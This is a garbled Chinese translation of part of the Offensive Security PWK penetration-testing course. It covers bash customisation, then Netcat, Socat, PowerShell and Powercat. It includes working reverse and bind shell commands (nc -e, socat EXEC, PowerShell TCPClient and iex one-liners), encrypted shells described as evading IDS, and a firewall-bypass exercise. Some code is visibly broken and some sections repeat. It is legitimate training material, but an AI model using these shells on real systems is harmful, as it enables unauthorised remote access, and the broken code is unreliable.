+⁷ (Wikipedia, 2019), https://en.wikipedia.org/wiki/tail
+
+⁷ (die.net, 2010), https://die.net/man/1/tail
+
+> (die.net, 1999), https://linux.de/man/1/watch
+
+(GNU, 2018), https://www.gnu.org/software/wget/manual/wget.html
+
+(MIT, 2004), http://www.mit.edu/afs/nipsb/user/ssen/src/curl-7.11.1/docs/curl.html
+
+(Ubuntu, 2019), http://manpages.ubuntu.com/manpages/man/axel.1
+
+# 攻性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+连接 18 已完成
+
+[100%] [11.1MB/s] [00:00]
+
+在 2 秒内下载了 26.4 Megabyte。(11380.17 KB/s)
+
+列表 69 - 使用 `axel` 下载文件
+
+## 3.8.3.1 练习题
+
+- 1. 使用 `curl`、`wget` 和 `axel` 从 `https://www.exploit-db.com` 下载漏洞的 PoC 代码，并为每个下载的文件保存不同的名称。
+
+## 3.9 自定义 Bash 环境
+
+### 3.9.1 Bash 历史记录自定义
+
+在模块的早些时候，我们讨论了环境变量和 `history` 命令的工作原理。我们可以使用许多环境变量来更改 `history` 命令的操作方式和数据返回，最常用的是 `HISTCONTROL`、`HISTIGNORE` 和 `HISTTIMEFORMAT`。
+
+`HISTIGNORE` 变量定义了是否删除重复命令、以空格开头的命令，或者两者都有。默认情况下，它们会被删除，但你可能会发现只忽略某些命令很有用：
+
+```
+kali@kali:-$ export HISTCONTROL=ignoreddu
+```
+
+列表 70 - 使用 `HISTCONTROL` 从历史记录中的重复项
+
+`HISTIGNORE` 变量特别用于过滤掉经常运行的基础命令，例如 `ls`、`export`、`history` 等：
+
+```
+kali@kali:-$ export HISTIGNORE="&ls:[bf]:exit:history"
+kali@kali:-$ mkdir test
+kali@kali:-$ cd test
+kali@kali:-~/test$ ls
+kali@kali:-~/test$ pwd
+/home/kali/test
+kali@kali:-~/test$ ls
+kali@kali:-~/test$ history
+  1 export HISTIGNORE="&ls:[bf]:exit:history"
+  2 mkdir test
+  3 cd test
+  4 pwd
+```
+
+列表 71 - 使用 `HISTIGNORE` 过滤基础、常用命令
+
+
+
+最后，`HISTTIMEFORMAT` 控制 `history` 命令输出中的日期和/或时间戳。
+
+```
+kali@kali:~/test$ export HISTTIMEFORMAT='%F %T' 
+
+kali@kali:~/test$ history
+1 2018-02-12 13:37:33 HISTIGNORE="&ls: [bf]:exit:history"
+2 2018-02-12 13:37:38 mkdir test
+3 2018-02-12 13:37:40 cd test
+4 2018-02-12 13:37:43 pwd
+5 2018-02-12 13:37:51 export HISTTIMEFORMAT='%F %T' 
+```
+
+列表 72 - 使用 `HISTTIMEFORMAT` 在 bash 历史记录中包含日期/时间
+
+在这个示例中，我们使用了 `%F`（8601格式的年-月-日）和 `%T`（24小时）。其他格式可以在 `strftime` 页面找到。
+
+## 3.9 别名 (Alias)
+
+别名是一个替换命令名称的字符串。别名对于将常用的命令和开关替换为更短的命令（即别名）有用。在其他情况下，别名是你从其他命令定义的自定义命令。一个例子是 `ls` 命令，我们通常使用 `-la`（以长列表显示结果，包括隐藏文件）。让我们看看如何使用别名来替换这个命令：
+
+```
+kali@kali:$ alias lsa='ls -la'
+kali@kali:$ lsa
+total 8308
+
+-rw------- 1 kali kali 5542 Jan 22 09:56 .bash_history
+-rw-r--r-- 1 kali kali 3391 Apr 25 2017 .bashrc
+drwx-xr-x 9 kali kali 4096 Oct 2 21:29 .cache
+...
+```
+
+列表 73 - `ls` 命令
+
+通过定义我们的命令别名 `ls`，我们可以在不带任何参数的情况下快速使用 `-la`。我们也可以通过运行不带参数的 `alias` 命令来查看别名列表。
+
+需要注意：`alias` 命令对用于定义别名的单词没有任何限制。因此，可以使用与任何现有命令匹配的单词来创建别名。我们可以在下面的示例中看到这一点：
+
+```
+kali@kali:$ alias mkdir='ping -c 1 localhost'
+kali@kali:$ mkdir
+PING localhost (56 bytes)
+64 bytes from localhost: icmp_seq=1
+--- statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time rtt min/avg = 0 ms
+```
+
+列表 74 - 创建一个覆盖 `mkdir` 命令的别名
+
+如果发生这种情况，解决方法很简单。我们可以退出当前的 shell 会话，或者使用 `unalias` 来取消设置。
+
+```
+kali@kali:-$ unalias mkdir
+```
+
+列表 75 - 取消 `mkdir` 命令的别名
+
+### 3.9.3 持久化自定义
+
+Bash 的行为取决于其配置文件。在之前的章节中，我们探讨了 `/etc/bashrc`。为了让设置持久化，我们需要将其写入文件。对于用户特定的设置，通常修改 `~/.bashrc`。 如果是全局设置，则修改 `/etc/bashrc`。
+
+```bash
+alias ll='ls -la'
+export HISTCONTROL=ignoredu
+export HISTTIMEFORMAT='%Y-%m-%d %H:%M:%S '
+```
+
+此外，你也可以在 `~/.bashrc` 中添加：
+
+```bash
+HISTSIZE=1000
+HISTFILE=~/.bash_history
+```
+
+这定义了历史记录在内存和文件中的行为。
+
+#### 3.9.3.1 练习题
+
+- 1. 使用 `curl`、`wget` 和 `axel` 从 `https://www.exploit-db.com` 下载漏洞的 PoC 代码，并为每个下载的文件保存不同的名称。
+
+## 3.10 总结
+
+在本模块中，我们初步查看了一些流行的命令行程序。记住参考 Offensive Security 网站进行更深入的讨论。
+
+## 实用工具
+
+现代安全可以访问许多想象中的先进工具。然而，在实战中，我们发现可以使用机器上已安装的工具。由于这些原因，熟悉了解某些实用工具至关重要。我们经常使用的工具包括 Netcat、Socat、PowerShell、Wireshark 和 Tcpdump。
+
+> 注意：视频和本指南使用的 IP 地址可能与 Offensive Security 实验室不匹配。这里的 IP 地址仅供示例。
+
+### Netcat
+
+Netcat 发布于 1995 年，是 Hobbit 的“原始”网络渗透工具之一，功能强大到被其作者称为黑客的“瑞士军刀”。对 Netcat 最清晰的定义来自 Hobbit 本人：“一个通过 TCP 或 UDP 连接进行读写数据的简单工具。”
+
+#### 4.1.1 连接到 TCP/UDP 端口
+
+正如描述，Netcat 可以以客户端或服务器模式运行。首先，让我们查看客户端模式。
+
+我们可以使用客户端模式连接到任何 TCP/UDP 端口，以便：
+
+- 端口是否开放或关闭。
+- 读取监听端口的服务的 banner。
+- 手动连接到网络服务。
+
+让我们开始使用 Netcat (`nc`) 检查实验室机器上的 TCP 端口 110（POP3 服务）是否开放。我们将多个参数：`-n` 跳过 DNS 名称解析；`-v` 增加详细信息；目标地址以及目标端口：
+
+```
+kali@kali:~ nc -nv 10.11.0.22 110
+(UNKNOWN) [10.11.0.22] 110 (pop3) open
+>OK POP server ready <00003.1277944@lab>
+```
+
+列表 77 - 使用 `nc` 连接到 TCP 端口
+
+列表 77 告诉了我们几点信息。首先，到 `10.11.0.22` 端口 `110`（术语上为 `10.11.0.22`）建立了 TCP 连接，因此 Netcat 报告远程端口是开放的。
+
+接下来，服务器通过“向我们回话”对我们的连接做出了响应，打印了服务器欢迎信息并提示登录，这是 POP3 服务的标准行为。
+
+让我们尝试与服务器进行交互：
+
+```
+kali@kali:~ - nc 10.11.0.22 110
+(UNKNOWN) [10.11.0.22] 110 (pop3) open
++OK POP3 server lab ready <00004.1546287@lab>
+USER offsec
++OK offsec welcome here
+PASS offsec
+-ERR unable to lock mailbox
+quit
++OK POP3 server signing off.
+kali@kali:-$
+```
+
+列表 78 - 使用 Netcat 连接到 POP3 服务
+
+我们已经成功地使用 Netcat 与 POP3 服务进行了对话（尽管登录尝试失败了）。
+
+#### 4.1.2 监听 TCP/UDP 端口
+
+使用 Netcat 监听 TCP/UDP 端口对于调试客户端应用程序非常有用，或者用于接收 TCP/UDP 网络连接。让我们尝试实现一个涉及两个机器的简单聊天服务，并将 Netcat 同时作为客户端和服务器。
+
+在 IP 地址为 `10.11.0.22` 的 Windows 机器上，我们设置 Netcat 监听 TCP 端口 `4444` 上的传入连接。我们使用 `-n` 选项禁用 DNS 解析，`-l` 创建监听器，`-v` 增加详细输出，并 `-p` 指定端口号：
+
+```
+C:\Users\offsec> nc -nlvp 4444
+listening on [any] 4444 ...
+```
+
+列表 79 - 使用 `nc` 设置监听器
+
+现在我们已经在这台 Windows 机器上为 Netcat 开启了 `4444` 端口，让我们从 Linux 机器连接它并交换一行文本：
+
+```
+kali@kali:~ - nc 10.11.0.22 4444
+(UNKNOWN) [10.11.0.22] 4444 (?) open
+This chat is from the linux machine
+```
+
+列表 80 - 使用 `nc` 连接到监听器
+
+我们的测试将通过 TCP 端口 `4444` 发送到 Windows 机器，我们可以从 Windows 机器继续这种“聊天”：
+
+```
+C:\Users\offsec> nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.11.0.22] <UNKNOWN> [10.11.0.4] 34447
+This chat is from the linux machine
+```
+
+这是来自 windows machine 的聊天
+
+列表 81 - 简单的 Netcat
+
+# 攻击性安全 (OFFENSIVE SECURITY)
+
+
+
+虽然这不是一个非常有趣的例子，但它展示了 Netcat 的几个重要特性。
+
+在继续之前，尝试回答这些重要问题：
+
+- 哪台机器充当了 Netcat 服务器？
+- 哪台机器充当了 Netcat 客户端？
+- 端口 `4444` 到底是在哪里打开的？
+- 客户端和服务器之间的命令行语法差异是什么？
+
+## 4.1.3 使用 Netcat 传输文件
+
+Netcat 还可以用于从一台计算机向另一台传输文本和二进制文件。事实上，取证调查人员使用 Netcat 配合 `dd`（一种磁盘复制工具）在网络上创建符合取证规范的磁盘镜像。
+
+要将文件从你的 Kali 虚拟机发送到 Windows 系统，我们启动一个与之前的聊天类似的设置，但略有不同。在 Windows 机器上，我们将在端口 `4444` 上设置一个 Netcat 监听器，并将任何输出重定向到名为 `incoming.exe` 的文件中。
+
+```
+C:\Users\offsec> nc -nlvp 4444 > incoming.exe
+listening on [any] 4444 ....
+```
+
+> 列表 82 - 使用 nc 接收文件
+
+在 Kali 系统上，我们将通过 TCP 端口 `4444` 将 `wget.exe` 文件推送到 Windows 机器：
+
+```
+kali@kali:$ locate wget.exe
+/usr/share/windows-resources/binaries/wget.exe
+kali@kali:$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
+(UNKNOWN) [10.11.0.22] 4444 (?) open
+```
+
+> 列表 83 - 使用 nc 传输文件
+
+Windows 机器上的 Netcat 接收到了连接，如下：
+
+```
+C:\Users\offsec> nc -nlvp 4444 > incoming.exe
+listening on [any] 4444 ....nconnect to [10.11.0.22] from <UNKNOWN> [10.11.0.4] 43459
+^C
+```
+
+注意，我们没有收到 Netcat 关于我们文件上传进度的任何反馈。在这种情况下，由于我们上传的文件很小，只需要等待几秒，然后通过尝试运行它来检查文件是否已完全上传到 Windows 机器：
+
+```
+C:\Users\offsec> incoming.exe -h
+GNU Wget 1.9.1, a non-interactive network retriever.
+Usage: incoming [OPTION]... [URL]...
+```
+
+> 列表 85 - Windows 上接收到连接
+
+我们可以这确实是 `wget.exe` 可执行文件，且文件传输成功。
+
+## 4.1.4 使用 Netcat 进行远程管理
+
+Netcat 最实用的功能之一是它的重定向能力。例如，通过将标准输入 `stdin`、标准输出 `stdout` 和标准错误 `stderr` 重定向到网络，我们可以执行命令。这是大多数 Linux 系统中 Netcat 的强大功能。然而，由于支持 `-e` 选项。
+
+### 4.1.4.1 绑定 Shell (Bind Shell)
+
+在我们的场景中，Alice 需要 Bob 的帮助。但 Alice 无法控制办公室的路由器，因此无法从路由器转发流量到她的内部机器。在这种情况下，我们可以利用 Netcat 的另一个有用功能：向在特定端口监听的主机发送 shell。在这种情况下，Alice 无法在本地计算机上绑定 `/bin/bash` 端口并让 Bob 连接，她可以将她的命令行控制权发送给 Bob 的机器。这被称为反向 Shell (Reverse Shell)。为了让其工作，Bob 首先将设置 Netcat 接收传入 shell。我们使用端口 `4444` 作为：
+
+```
+C:\Users\offsec> nc -nlvp 4444
+listening on [any] 4444 ...
+```
+
+列表 88 - 使用 nc 设置监听器以接收反向 Shell
+
+### 4.1.4.2 反向 Shell 场景 (Reverse Shell Scenario)
+
+在我们的场景中，Alice 需要 Bob 的帮助。但 Alice 无法控制办公室的路由器，因此无法从路由器转发流量到她的内部机器。在这种情况下，我们可以利用 Netcat 的另一个有用功能：向在特定端口监听的主机发送 shell。在这种情况下，Alice 无法在本地计算机上绑定 `/bin/bash` 端口并让 Bob 连接，她可以将她的命令行控制权发送给 Bob 的机器。这被称为反向 Shell。为了让其工作，Bob 首先将设置 Netcat 接收传入 shell。我们使用端口 `4444` 作为示例：
+
+```
+C:\Users\offsec> nc -nlvp 4444
+listening on [any] 4444 ...
+```
+
+## 攻击性安全 Kali Linux 渗透测试 2.0
+
+现在，Alice 可以从她的 Linux 机器向 Bob 发送反向 shell（reverse shell）。我们再次使用 `-e` 选项让应用程序远程化，在本例中该程序恰是 `/bin/bash`，即 Linux shell：
+
+```
+kali@kali:-$ ip address eth0 | grep inet
+inet 10.11.0.4/16 brd 10.11.0.255 scope dynamic eth0
+
+kali@kali:-$ nc -nv 10.11.0.22 4444 -e /bin/bash
+(UNKNOWN) [10.11.0.22] 4444 () open
+```
+
+一旦建立连接，Alice 的 Netcat 已将 `/bin/bash` 的输入、输出和错误数据重定向到 Bob 机器上的端口 `4444`，Bob 可以与该 shell 交互：
+
+```
+C:\Users\offense:nc -nlvp 4444
+listening to [any] 4444 ...
+connect to [10.11.0.22] from <UNKNOWN> [10.11.0.4] 43482
+```
+
+```
+ip address eth0 | grep inet
+inet 10.11.0.4/16 brd 10.11.0.255 scope dynamic eth0
+```
+
+花些时间考虑绑定 shell（bind shell）和反向 shell（reverse shell）之间的区别，以及从组织安全的角度来看，这些差异如何适用于各种防火墙配置。要意识到，出站流量可能入站流量一样有害。下图描述了反向 shell 场景，Bob 获取了 Alice Linux 机器的远程访问权限，并穿越了企业防火墙：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_79_0.png)
+
+## Kali Linux 渗透测试 2.0
+
+## 攻击性安全
+
+www.offensive-security.com
+
+![](img/f99f528ca9845f4c256ce54e882b1345_80_0.png)
+
+图 9：Netcat 反向 shell 阻止了我们的绑定访问
+
+基于主机的防火墙阻止对我们绑定 shell 的访问并不罕见。这有时非常令人沮丧，尤其是在面临压力且受时间限制时。如有疑问，我们使用反向 shell，因为它们通常更容易排查故障。
+
+### 4.1.4.3 练习
+
+（这些练习不需要报告）
+
+- 1. 在你的 Kali 机器和 Windows 系统之间实现一个简单的聊天。
+- 2. 使用 Netcat 创建：
+    a. 从 Kali 到 Windows 的反向 shell。
+    b. 从 Windows 到 Kali 的反向 shell。
+    c. 在 Kali 上建立绑定 shell。使用你的 Windows 系统连接它。
+    d. 在 Windows 上建立绑定 shell。使用你的 Kali 机器连接它。
+- 3. 从你的 Kali 机器向 Windows 传输文件，反亦然。
+- 4. 在你的 Windows 系统开启防火墙的情况下进行练习。根据需要调整练习以绕过防火墙保护，并理解练习的哪些部分无法成功完成。
+
+PWK 2.0 版权 © Offensive Security Ltd. 保留所有权利。 81
+
+## 4.2 Socat
+
+Socat 是一个命令行实用，它可以建立两个双向字节流并在它们之间传输数据。对于渗透测试，它类似于 Netcat，但具有额外的功能。
+
+虽然 socat 可以做很多事情，但我们只涵盖其中几项来演示其用法。让我们开始探索 socat 并看看它与 Netcat 相比如何。
+
+### 4.2.1 Netcat vs Socat
+
+首先，让我们分别使用 Netcat 和 socat 连接到端口 `80` 上的服务器：
+
+
+
+```
+kali@kali:~ nc <remote server's ip address> 80
+kali@kali:~ socat TCP4:<remote server's ip address>:80
+```
+
+> 图 91：使用 `socat` 连接到端口 80 的服务器，与 `nc` 语法对比
+
+注意 `nc` 的语法简单，但 `socat` 需要通过 `STDIO` 传输、远程主机（允许与 shell 交互）以及协议（`TCP`）。协议、选项和端口号是用冒号分隔的。
+
+由于绑定 1024 以下的监听器需要 root 权限，因此当在端口 443 启动监听器时，我们需要使用 `sudo`：
+
+```
+kali@kali:~ sudo nc -lvp 443
+kali@kali:~ sudo socat TCP4-LISTEN:443 STDOUT
+```
+
+> 图 92：使用 `socat` 创建监听器，与 `nc` 的语法对比
+
+注意监听器（`TCP-LISTEN`）和重定向输出的 `STDOUT` 参数要求。
+
+### 4.2.2 Socat 文件传输
+
+我们将尝试传输文件。继续 Alice 和 Bob 的虚构示例，假设 Alice 需要发送一个名为 `secret_passwords.txt` 的文件。提醒：Alice 的机器运行在 Linux 上，Bob 的运行在 Windows 上。我们可以看到这一点：
+
+在 Alice 侧，在端口 443 分文件。在本例中，`TCP-LISTEN` 指定了 IPv4 监听器，`fork` 允许多个连接，`file` 指定了文件名：
+
+```
+kali@kali:~ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
+```
+
+> 图 93：使用 `socat` 传输文件
+
+在 Bob 侧，我们将连接 Alice 并检索文件。在本例中，`TCP` 选项指定了 IPv4，随后是 Alice 的 IP 地址 (`10.11.0.4`) 和监听端口 (`443`)，`file` 指定了保存到 Bob 计算机的文件，`create` 指定了文件：
+
+```
+C:\Users\offsec> socat TCP4:10.11.0.4:443 file:received_passwords.txt
+```
+
+```
+C:\Users\offsec> type-hard!!!
+```
+
+> 图 94：使用 `socat` 接收文件
+
+### 4.2.3 Socat 反向 shell
+
+看看使用 `socat` 的反向 shell。为此，Bob 将在端口 443 启动一个监听器。他将提供 `-d` 选项以增加详细性（显示致命、错误和通知消息），`TCP-LISTEN:443` 连接端口 443 的 IPv4 监听器，`STDOUT` 将标准输出（`STDOUT`）连接到 socket：
+
+```
+C:\Users\offsec> socat -d TCP-LISTEN:443 STDOUT
+```
+
+> 图 95：使用 `socat` 创建监听器
+
+接下来，Alice 将使用 `EXEC` 选项（类似于 Netcat 选项），一旦建立反向 shell 连接，它将执行指定的程序。在这种情况下，Alice 将向 Bob 在 `10.11.0.22:443` 上的监听 socket 发送 `/bin/bash` reverse shell (`EXEC:/bin/bash`)：
+
+```
+kali@~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+```
+
+> 图 96：使用 `socat` 发送反向 shell
+
+一旦连接，Bob 可以从他的 shell 输入命令，这些命令将在 Alice 的机器上执行：
+
+```
+whoami
+id
+uid=1000(kali) gid=1000(kali) groups=1000(kali)
+```
+
+> 图 97：退出
+
+这是一个很好的开始，我们涵盖了一些重要主题，但到目前，所有的网络活动都是明文的。让我们看看使用 `socat` 加密的基础：
+
+### 4.2.4 Socat 加密绑定 shell
+
+为了给绑定添加加密，我们将依靠 SSL 证书。这种级别的加密有助于规避入侵检测系统 (`IDS`) 并帮助隐藏我们接收的敏感数据。
+
+继续 Alice 和 Bob 的示例，我们将使用 `openssl` 通过以下选项创建一个自签名证书：
+
+- `req`：发起新的证书请求
+- `newkey`：生成一个新的密钥
+- `rsa2048`：使用 2048 位密钥的 RSA 加密
+- `nodes`：不带密码存储私密钥
+- `keyout`：将私密钥保存到文件
+- `x509`：输出自签名证书而不是证书请求
+- `days`：按天设置有效期
+- `out`：将证书保存到文件
+
+一旦生成密钥，我们将证书及其私密钥 `cat` 到文件中，最终我们将使用它来加密绑定 shell。
+
+我们将在 Alice 的机器上通过此过程：
+
+```
+kali~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
+Generating 2048 bit RSA private key
+....
++++++++
+writing new private key to 'bind_shell.key'
+```
+
+你将被要求输入将整合到证书请求中的信息。你即将输入的内容被称为区分名称（Distinguished Name，简称 `DN`）。由于某些字段会有默认值，如果你输入 `'.'`，该字段将留空。
+
+国家名称（2 位代码）：`US`
+
+州或省名称（全名）：`Georgia`
+
+市名称（例如，城市）：`Atlanta`
+
+组织名称（例如，公司）：`Offsec`
+
+组织单位（例如，部门）：`Try Hard Department`
+
+通用名称（例如，服务器 FQDN 或你的姓名）：
+
+电子邮件地址：
+
+```
+kali~$ cat bind_shell.key bind_shell.crt > bind_shell.pem
+```
+
+> 图 98：设置 `socat`
+
+现在密钥和证书已经生成，我们首先需要将其转换为 `socat` 可用的格式。在创建加密的 `socat` shell 之前，将 `bind_shell.key` 和 `bind_shell.crt` 合并为 `.pem` 文件：
+
+```
+kali~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+```
+
+现在，我们可以让 Bob 的机器连接到 Alice 的绑定 shell。
+
+> 图 99：使用 `socat` 创建加密绑定 shell
+
+我们将使用 `—` 来在 `STDIO` 和远程主机之间传输数据，使用 `OPENSSL` 在 Alice 在 `10.11.0.4:443` 上的监听器上建立远程 SSL 连接，并使用 `verify=0` 禁用 SSL 证书验证：
+
+```
+C:\Users\offsec> socat OPENSSL:10.11.0.4:443,verify=0
+id=1000(kali) gid=1000(kali) groups=1000(kali)
+whoami
+kali
+```
+
+列表 100 - 使用 `socat` 连接到加密的 bind shell
+
+太棒了！我们的 bind shell 已成功创建，我们能够向 Alice 的机器发送命令了。
+
+花点时间自己探索一下 `socat`。这是在渗透测试期间非常有益的许多工具之一。
+
+#### 4.2.4.1 练习
+
+- 1. 使用 `socat` 将 `powercat.ps1` 从你的 Kali 机器传输到你的 Windows 系统。在下一节中使用你系统上的该文件。
+- 2. 使用 `socat` 从你的 Windows 系统到你的 Kali 机器创建一个加密的反向 shell。
+- 3. 在你的 Windows 系统上创建一个加密的 bind shell。尝试在不使用加密的情况下从 Kali 连接它。它有效吗？
+- 4. 在你的 Windows 系统上创建一个未加密的 `socat` bind shell。使用 Netcat 连接到该 shell。它有效吗？
+
+> 注意：如果 `cmd.exe` 没有执行，请根据收到的输出，研究你可能需要传递给 `EXEC` 选项的其他其他参数。
+
+## 4.3 PowerShell 和 Powercat
+
+Windows PowerShell 是一种基于任务的命令行 shell 和脚本语言。它专门为系统管理员和高级用户设计，用于快速自动化地管理多个操作系统（Linux、macOS、Unix 和 Windows）以及运行在这些系统上的进程。
+
+不用说，PowerShell 是渗透测试的强大工具，可以安装在各种版本的 Windows 上（或在这些版本中默认安装）。从 Windows Server 2008 R2 和 Windows 7 开始，现代 Windows 平台默认带有 PowerShell。PowerShell 5.0 运行在以下 Windows 版本上：
+
+- Windows Server 2016，默认安装
+
+
+
+- Windows Server 2012 R2/Windows Server 2012/Windows Server 2008 R2 带有 Service Pack 1/8.1/Windows 7 带有 Service Pack 1（安装 `Windows Management Framework 5.0` 以运行它）
+
+`Windows PowerShell 4.0` 运行在以下 Windows 版本上：
+
+- Windows 8.1/`Windows Server 2012 R2`，默认安装
+- Windows 7 带有 Service Pack 1/`Windows Server 2008 R2` 带有 Service Pack 1（安装 `Windows Management Framework 4.0` 以运行它）
+
+`Windows PowerShell 3.0` 运行在以下 Windows 版本上：
+
+- Windows 8/`Windows Server 2012`，默认安装
+- Windows 7 带有 Service Pack 1/`Windows Server 2008 R2` 带有 Service Pack 1/2（安装 `Windows Management Framework 3.0` 以运行它）
+
+`PowerShell` 包含一个集成环境（ISE），它允许你编写、测试和调试脚本。ISE 提供了代码补全、语法高亮、[https://docs.microsoft.com/en-us/powershell/v7.3/microsoft/powershell/about/powershell-ise](https://docs.microsoft.com/en-us/powershell/v7.3/microsoft/powershell/about/powershell-ise) 等功能。`PowerShell` 的执行策略决定哪些脚本可以运行。默认策略是“Restricted”，这可以保护你免受不受信任脚本的影响。更改执行策略可能会让你暴露于风险，例如，“Unrestricted”策略允许运行脚本，包括来自互联网的脚本。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+循环后紧跟着关闭客户端连接的调用。在循环内部，我们可以看到几行负责向网络流中读取和写入数据的代码。请注意，`iex`（'Invoke-Expression'）是执行此操作的关键 cmdlet，因为它可以将任何字符串运行，并且命令的结果会被重定向并通过流作为命令传回：
+
+这段代码可以粘贴到诚然很长的单行命令中并作为命令执行：
+
+```hell
+C:\Users\offsec> powershell $client = New-Object System.Net.Sockets.TCPClient('10.0.11.43');$stream = $client.GetStream();[byte[]]$bytes = 0;65535;|while($i = $stream.Read($bytes,0,$bytes.Length)-ne 0){$send = New-Object -TypeName System.Text.ASCIIEncoding;$send.GetBytes($bytes);$sendback = (iex $data 2>&1 | Out-String);$sendback = $sendback + ' ' + ($data.Path);$sendbyte = [text.encoding]::ASCII;$client.GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();$client.Close()}
+```
+
+这个单行命令初看之下可能非常费琐，但我们需要记住它；在现场渗透期间，我们很可能会复制粘贴此类命令（替换 IP 和端口号）。
+
+最后，我们通过 Netcat 接收反弹 shell：
+
+```
+kali@kali: sudo nc -lnvp 443
+listening on (any) 443 ...
+connect to [10.0.11.4] [UNKNOWN] 63515
+```
+
+> 列表 106 - 使用 nc 接收反弹 shell
+
+简而言之，通过简单地替换 `System.Net.Sockets.TCPClient` 中的 IP 地址和端口号，我们可以轻松地复用此 `PowerShell` 反弹 shell 命令。
+
+## 4.3.3 PowerShell 绑定 Shell
+
+处理绑定 shell（bind shells）时，过程是反过来的的。我们首先在 Bob 的电脑上通过 `PowerShell` 创建绑定 shell，然后从 Alice 的电脑使用 Netcat 连接它。
+
+在下面的代码段中，我们将再次将命令传递给 `powershell -c` 选项。除了客户端、流和字节变量外，我们还有一个新的监听变量，它使用了 `System.Net.Sockets.TcpListener(443)` 类。该类需要两个参数：第一个用于监听，紧接着是端口。通过提供 `0.0.0.0` 作为本地地址，我们的绑定 shell 将在网络中的所有 IP 地址上可用。我们使用 `iex` cmdlet 执行我们的命令：
+
+```hell
+C:\Users\offsec> powershell $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$client = $listener.start();$stream = $client.GetStream();[byte[]]$bytes = 0;65535;|while($i = $stream.Read($bytes,0,$bytes.Length)-ne 0){$data = New-Object -TypeName System.Text.ASCIIEncoding;$send.GetBytes($bytes,0,1);$sendback = (iex $data 2>&1 | Out-String);$sendback = $sendback + ' ' + (pwd).Path + ' ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();$client.Close();$listener.Stop()
+```
+
+> 列表 107 - 使用 Netcat 设置绑定 shell
+
+绑定监听开启后，我们可以像使用其他 shell 一样，从 Alice 的机器使用 Netcat 进行连接。我们为 Netcat 包含了 `-v` 选项，因为我们的绑定在连接时并不总是会显示命令：
+
+```bash
+kali@kali:~ nc -nv 10.1.0.22 443
+(UNKNOWN) [10.1.0.22] 443 open
+ipconfig
+Windows IP Configuration
+Ethernet adapter Connection:
+Connection-specific DNSuffix: 
+IPv4 Address                     : 10.1.0.22
+Subnet Mask                      : 255.255.255.0
+Default Gateway                  : 10.1.0.1
+C:\Users\offsec>
+```
+
+> 列表 108 - 使用 nc 连接绑定 shell
+
+`PowerShell` 极其强大，我们甚至还没有触及其功能的皮毛。由于微软对 Windows 管理中 `PowerShell` 的日益增加，了解如何使用 `PowerShell` 实现我们的目标至关重要。请参考 `System.net` 文档获取更多类和方法。
+
+## 4.3.4 Powercat
+
+`Powercat` 本质上是 Netcat 的 `PowerShell` 版本。它是我们可以下载到 Windows 主机的脚本，简化了绑定/反弹 shell 的创建。
+
+可以在 Kali 中通过 `apt install powercat` 安装 `powercat`，会将脚本放在 `/usr/share/powercat/`。由于我们已经熟悉文件传输，跳过了从 Kali 机器传输脚本到 Windows 主机的这一步。
+
+在目标主机上，我们通过使用 `.powercat.ps1` 开始。这将脚本中声明的所有变量和函数在当前 `PowerShell` 范围内可用。通过这种方式，我们可以直接使用 `powercat` 函数，而不是每次都执行脚本。值得注意的是，这样加载的脚本仅在当前的 `PowerShell` 实例有效，每次重启 `PowerShell` 都需要重新加载。现在我们的脚本已加载，可以执行 `powercat`：
+
+```hell
+
+PS C:\Users\offsec> .powercat.ps1
+
+```
+
+我们可以通过查看帮助菜单来快速熟悉 `powercat`：
+
+```hell
+
+
+
+PS C:\Users\offsec> `powercat -h`
+
+Netcat, The PowerShell Version
+
+Usage: `powercat [-c or l] [-p] [options]`
+
+  `-c` Client Mode. 提供要连接的系统的 IP。
+
+  `-l` Listen Mode. 在 `-p` 指定端口上启动监听器。
+
+  `-p <port>` 要连接的端口或监听的端口。
+
+  `-e <proc>` 执行。指定要启动的进程名称。
+
+  `-i <input>` 输入。通过管道发送字节数组对象或字符串。对于移动文件，可以提供文件路径。你也可以管道任何内容，如 `'aaaaaaa' | powercat -c 10.1.1.1 -p 80...`
+
+  `-g` Generate Payload. 返回带有指定选项执行的脚本字符串。`-i`、`e` 将包含在内。
+
+  `-ge` Generate Encoded Payload. 与 `-g` 相同，但返回可以使用这种方式执行的字符串：`powershell -E <encoded string>`
+
+  `-h` 打印此帮助消息。
+
+> 列表 112 - Powercat 帮助菜单
+
+让我们回顾如何像之前一样使用 `powercat` 进行文件传输和绑定反弹 shell。
+
+## 4.3.5 Powercat 文件传输
+
+虽然我们可以使用之前讨论的任何工具将 Powercat 传输到目标，但让我们看看使用 `powercat` 将自身（`powercat.ps1`）从 Bob 传输到 Alice 以演示文件传输。
+
+首先，在 Alice 的电脑上运行 Netcat 监听：
+
+```bash
+kali@kali:~ sudo nc -lvp 443 > receiving_powercat.ps1
+
+listening on (any) 443 ... (UNKNOWN) [10.1.0.22] 63661
+```
+
+> 列表 113 - 使用 `nc` 为 `powercat` 文件传输设置监听器
+
+接下来，将在 Bob 的电脑上使用 `powercat`。`-c` 选项指定客户端模式并设置 IP 地址，`-p` 指定连接端口号，`-i` 指定要传输的本地文件：
+
+```powershell
+PS C:\Users\Offsec> powercat -c 10.1.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
+```
+
+> 列表 114 - 使用 `powercat` 发送文件
+
+最后，杀死 Netcat 进程并检查文件已接收：
+
+```bash
+kali@kali:~ ls receiving_powercat.ps1
+
+receiving_powercat.ps1
+```
+
+> 列表 115 - 验证通过 `powercat` 发送的文件
+
+## 4.3.6 Powercat 反弹 shell
+
+反弹 shell 过程与我们看到的类似。我们将在 Alice 的电脑上启动一个 Netcat 监听，然后 Bob 将使用 `powercat` 发送反弹 shell。
+
+我们从 Alice 机器上的 Netcat 监听开始：
+
+```bash
+kali@kali: sudo nc -lvp 443
